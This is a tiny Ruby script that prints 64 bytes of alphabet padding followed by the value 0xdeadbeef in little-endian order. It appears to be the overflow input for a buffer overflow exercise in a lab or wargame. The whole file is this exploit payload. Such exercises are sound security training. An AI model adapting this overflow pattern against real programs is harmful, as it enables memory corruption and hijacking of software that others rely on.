#!/usr/bin/ruby

padding = "AAAABBBBCCCCDDDDEEEEFFFFGGGGHHHHIIIIJJJJKKKKLLLLMMMMNNNNOOOOPPPP";
deadbeef = "\xef\xbe\xad\xde";
puts padding + deadbeef;
